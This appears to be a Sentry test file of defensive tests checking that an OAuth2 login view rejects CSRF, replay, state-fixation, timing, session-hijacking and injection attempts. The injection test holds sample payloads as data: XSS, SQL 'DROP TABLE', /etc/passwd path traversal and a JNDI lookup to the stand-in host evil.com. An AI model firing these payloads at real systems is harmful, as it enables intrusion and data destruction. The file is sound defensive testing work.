"""
Security-focused tests for OAuth2 implementation against known attack vectors.
"""

from unittest.mock import patch
from urllib.parse import urlencode

from django.contrib.sessions.middleware import SessionMiddleware
from django.http import HttpResponse
from django.test import RequestFactory

import sentry.identity
from sentry.identity.oauth2 import OAuth2LoginView
from sentry.identity.pipeline import IdentityPipeline
from sentry.identity.providers.dummy import DummyProvider
from sentry.testutils.cases import TestCase
from sentry.testutils.silo import control_silo_test


@control_silo_test
class OAuth2SecurityAttackTests(TestCase):
    """Security tests against known attack vectors for OAuth2."""

    def setUp(self):
        sentry.identity.register(DummyProvider)
        super().setUp()
        self.factory = RequestFactory()
        self.view = OAuth2LoginView(
            authorize_url="https://example.org/oauth2/authorize",
            client_id="123456",
            scope="all-the-things",
        )

    def tearDown(self):
        super().tearDown()
        sentry.identity.unregister(DummyProvider)

    def _get_request_with_session(self, url):
        """Helper to create a request with session support."""
        request = self.factory.get(url)
        request.subdomain = None
        request.user = self.create_user()
        middleware = SessionMiddleware(lambda r: HttpResponse())
        middleware.process_request(request)
        request.session.save()
        return request

    def test_csrf_attack_with_malicious_authorization_code(self):
        """
        Test CSRF attack scenario where attacker tries to use their authorization
        code in victim's session.

        Attack Vector: Attacker gets their own OAuth code, then tricks victim
        into visiting URL with that code but no/wrong state.
        """
        # Simulate attacker's authorization code
        attacker_code = "attacker_auth_code_12345"

        # Victim has legitimate OAuth state in session
        request = self._get_request_with_session(f"/?code={attacker_code}")
        pipeline = IdentityPipeline(request=request, provider_key="dummy")
        pipeline.bind_state("state", "victim_legitimate_state")

        # Attack: No state parameter provided
        response = self.view.dispatch(request, pipeline)

        # Should reject and start new flow (not process attacker's code)
        assert response.status_code == 302
        assert "example.org/oauth2/authorize" in response["Location"]

    def test_csrf_attack_with_guessed_state(self):
        """
        Test CSRF attack where attacker tries to guess or forge state parameter.
        """
        # Common weak state values an attacker might try
        weak_states = [
            "1",
            "123456",
            "state",
            "oauth_state",
            "csrf_token",
            "12345678901234567890",  # Predictable pattern
            "",  # Empty string
        ]

        for malicious_state in weak_states:
            request = self._get_request_with_session(
                f"/?code=attacker_code&state={malicious_state}"
            )
            pipeline = IdentityPipeline(request=request, provider_key="dummy")
            # Victim has strong cryptographic state
            pipeline.bind_state("state", "strong_crypto_state_789abc123def456")

            response = self.view.dispatch(request, pipeline)

            # Should reject weak/guessed state
            assert response.status_code == 302
            assert "example.org/oauth2/authorize" in response["Location"]

    def test_replay_attack_with_reused_authorization_code(self):
        """
        Test replay attack where attacker captures and reuses authorization code.

        Scenario: Legitimate user completes OAuth, attacker captures the callback
        URL and tries to replay it later.
        """
        # Step 1: Legitimate OAuth flow starts
        legitimate_request = self._get_request_with_session("/auth/login/dummy/")
        pipeline = IdentityPipeline(request=legitimate_request, provider_key="dummy")

        # Generate state for legitimate flow
        self.view.dispatch(legitimate_request, pipeline)
        # Extract the state that would be used
        legitimate_state = "legitimate_state_abc123"
        pipeline.bind_state("state", legitimate_state)

        # Step 2: Legitimate user completes OAuth (simulate)
        callback_request = self._get_request_with_session(
            f"/?code=legitimate_auth_code&state={legitimate_state}"
        )
        callback_pipeline = IdentityPipeline(request=callback_request, provider_key="dummy")
        callback_pipeline.bind_state("state", legitimate_state)

        with patch.object(callback_pipeline, "next_step") as mock_next:
            with patch.object(callback_pipeline, "fetch_state") as mock_fetch:
                mock_fetch.return_value = legitimate_state  # Mock state validation
                mock_next.return_value = HttpResponse(status=200)
                self.view.dispatch(callback_request, callback_pipeline)
                mock_next.assert_called_once()

        # Step 3: Attacker tries to replay the same URL later
        # (In new session, state would be cleared/different)
        replay_request = self._get_request_with_session(
            f"/?code=legitimate_auth_code&state={legitimate_state}"
        )
        replay_pipeline = IdentityPipeline(request=replay_request, provider_key="dummy")
        # No state in attacker's session OR different state
        replay_pipeline.bind_state("state", "different_session_state")

        replay_response = self.view.dispatch(replay_request, replay_pipeline)

        # Should reject replayed authorization code due to state mismatch
        assert replay_response.status_code == 302
        assert "example.org/oauth2/authorize" in replay_response["Location"]

    def test_state_fixation_attack(self):
        """
        Test state fixation attack where attacker tries to fix the state value.

        Attack: Attacker starts OAuth flow, captures state, then tricks victim
        into using that same state value.
        """
        # Attacker starts OAuth flow and gets state
        attacker_request = self._get_request_with_session("/auth/login/dummy/")
        attacker_pipeline = IdentityPipeline(request=attacker_request, provider_key="dummy")

        self.view.dispatch(attacker_request, attacker_pipeline)
        # Attacker captures the state from redirect URL
        fixed_state = "attacker_controlled_state_123"

        # Victim session with different state
        victim_request = self._get_request_with_session(f"/?code=auth_code&state={fixed_state}")
        victim_pipeline = IdentityPipeline(request=victim_request, provider_key="dummy")
        victim_pipeline.bind_state("state", "victim_legitimate_state_456")

        response = self.view.dispatch(victim_request, victim_pipeline)

        # Should reject due to state mismatch
        assert response.status_code == 302
        assert "example.org/oauth2/authorize" in response["Location"]

    def test_timing_attack_on_state_comparison(self):
        """
        Test that state comparison is not vulnerable to timing attacks.

        This ensures the comparison doesn't leak information about the correct state.
        """
        import time

        correct_state = "correct_state_" + "a" * 32

        # Measure time for completely wrong state
        wrong_state = "wrong_state_" + "b" * 32
        request1 = self._get_request_with_session(f"/?code=test&state={wrong_state}")
        pipeline1 = IdentityPipeline(request=request1, provider_key="dummy")
        pipeline1.bind_state("state", correct_state)

        start_time = time.time()
        self.view.dispatch(request1, pipeline1)
        wrong_time = time.time() - start_time

        # Measure time for partially matching state
        partial_state = "correct_state_" + "b" * 32  # Same prefix
        request2 = self._get_request_with_session(f"/?code=test&state={partial_state}")
        pipeline2 = IdentityPipeline(request=request2, provider_key="dummy")
        pipeline2.bind_state("state", correct_state)

        start_time = time.time()
        self.view.dispatch(request2, pipeline2)
        partial_time = time.time() - start_time

        # Timing should be similar (within reasonable variance)
        # This test would catch obvious timing vulnerabilities
        time_diff = abs(wrong_time - partial_time)
        assert time_diff < 0.01, f"Potential timing attack: {wrong_time} vs {partial_time}"

    def test_parameter_pollution_attack(self):
        """
        Test parameter pollution attack with multiple code/state parameters.

        Attack: Send multiple values for same parameter to confuse parsing.
        """
        # Multiple code parameters
        params = urlencode(
            [
                ("code", "legitimate_code"),
                ("code", "malicious_code"),
                ("state", "correct_state"),
            ]
        )

        request = self._get_request_with_session(f"/?{params}")
        pipeline = IdentityPipeline(request=request, provider_key="dummy")
        pipeline.bind_state("state", "correct_state")

        # Should handle parameter pollution gracefully
        response = self.view.dispatch(request, pipeline)

        # Should either process legitimately or reject safely
        # (depends on which parameter value is used)
        assert response.status_code == 302

    def test_injection_attacks_in_state_parameter(self):
        """
        Test injection attacks through state parameter.

        Ensures state parameter is properly sanitized and doesn't enable
        injection attacks.
        """
        malicious_states = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded path traversal
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # JNDI injection
        ]

        for malicious_state in malicious_states:
            request = self._get_request_with_session(f"/?code=test_code&state={malicious_state}")
            pipeline = IdentityPipeline(request=request, provider_key="dummy")
            pipeline.bind_state("state", "legitimate_state")

            # Should handle malicious state safely
            response = self.view.dispatch(request, pipeline)

            # Should reject due to state mismatch and not cause errors
            assert response.status_code == 302
            assert "example.org/oauth2/authorize" in response["Location"]

    def test_session_hijacking_attempt(self):
        """
        Test attempt to hijack another user's OAuth session.

        Scenario: Attacker tries to use victim's session ID or state.
        """
        # Victim starts OAuth flow
        victim_request = self._get_request_with_session("/auth/login/dummy/")
        victim_pipeline = IdentityPipeline(request=victim_request, provider_key="dummy")
        victim_state = "victim_state_789"
        victim_pipeline.bind_state("state", victim_state)

        # Attacker tries to use victim's state in their own session
        attacker_request = self._get_request_with_session(
            f"/?code=attacker_code&state={victim_state}"
        )
        # Different session/pipeline
        attacker_pipeline = IdentityPipeline(request=attacker_request, provider_key="dummy")
        # Attacker doesn't have victim's state in their session
        attacker_pipeline.bind_state("state", "attacker_different_state")

        response = self.view.dispatch(attacker_request, attacker_pipeline)

        # Should reject - attacker can't access victim's session state
        assert response.status_code == 302
        assert "example.org/oauth2/authorize" in response["Location"]

    def test_concurrent_session_isolation(self):
        """
        Test that concurrent OAuth sessions are properly isolated.

        Ensures one user's OAuth flow cannot interfere with another's.
        """
        # User 1 starts flow
        user1_request = self._get_request_with_session("/auth/login/dummy/")
        user1_pipeline = IdentityPipeline(request=user1_request, provider_key="dummy")
        user1_state = "user1_unique_state"
        user1_pipeline.bind_state("state", user1_state)

        # User 2 starts flow
        user2_request = self._get_request_with_session("/auth/login/dummy/")
        user2_pipeline = IdentityPipeline(request=user2_request, provider_key="dummy")
        user2_state = "user2_unique_state"
        user2_pipeline.bind_state("state", user2_state)

        # User 1 completes with User 2's state (attack scenario)
        cross_request = self._get_request_with_session(f"/?code=user1_code&state={user2_state}")
        cross_request.session = user1_request.session  # Use User 1's session

        response = self.view.dispatch(cross_request, user1_pipeline)

        # Should reject - User 1's session doesn't have User 2's state
        assert response.status_code == 302
        assert "example.org/oauth2/authorize" in response["Location"]
